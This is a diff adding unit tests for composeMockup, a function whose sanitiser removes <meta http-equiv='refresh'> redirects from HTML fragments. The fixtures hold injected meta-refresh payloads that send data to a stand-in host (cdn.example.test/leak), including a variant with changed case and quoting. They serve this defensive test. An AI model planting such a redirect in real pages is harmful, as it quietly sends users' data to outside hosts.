@@ -440,5 +440,55 @@ describe('composeMockup', () => {
         expect(html).toContain('alt=x')
       })
     })
+
+    // Fix round 2. Neither the meta CSP (fix round 1) nor an empty
+    // sandbox="" reaches a meta-refresh redirect: it is a NAVIGATION, and
+    // CSP's fetch directives govern fetches, not navigations, while empty
+    // sandbox only blocks a sandboxed frame from navigating something ELSE
+    // (the top browsing context) — navigating itself is untouched. This is
+    // the channel closed by dropping the whole <meta http-equiv="refresh">
+    // tag at compose time.
+    describe('fix round 2: a <meta http-equiv="refresh"> redirect', () => {
+      it('drops a meta refresh tag entirely, leaving the rest of the fragment intact', () => {
+        const fragments = new Map([
+          [
+            'morning',
+            '<section><meta http-equiv="refresh" content="0;url=https://cdn.example.test/leak?data=x">M</section>',
+          ],
+          ['money', '<section>£</section>'],
+        ])
+        const html = composeMockup(SCREENS, fragments)
+        // Not a bare `not.toContain('http-equiv')` — composeMockup's own
+        // meta CSP tag legitimately carries `http-equiv="Content-Security-
+        // Policy"` (fix round 1), so the assertion has to name the specific
+        // thing that must be gone: the word "refresh" (case-insensitive
+        // anywhere) and the URL it was smuggling.
+        expect(html.toLowerCase()).not.toContain('refresh')
+        expect(html).not.toContain('cdn.example.test')
+        expect(html).toContain('M</section>')
+      })
+
+      it('matches case-insensitively and regardless of attribute order/whitespace/quoting', () => {
+        const fragments = new Map([
+          [
+            'morning',
+            "<section><META CONTENT='0;url=https://cdn.example.test/leak' HTTP-EQUIV = \"REFRESH\">M</section>",
+          ],
+          ['money', '<section>£</section>'],
+        ])
+        const html = composeMockup(SCREENS, fragments)
+        expect(html).not.toContain('cdn.example.test')
+        expect(html).toContain('M</section>')
+      })
+
+      it('leaves an unrelated <meta> tag (e.g. viewport) alone — this is a targeted drop, not a sweep of every meta tag', () => {
+        const fragments = new Map([
+          ['morning', '<section><meta name="description" content="a panel">M</section>'],
+          ['money', '<section>£</section>'],
+        ])
+        const html = composeMockup(SCREENS, fragments)
+        expect(html).toContain('<meta name="description" content="a panel">')
+      })
+    })
   })
 })
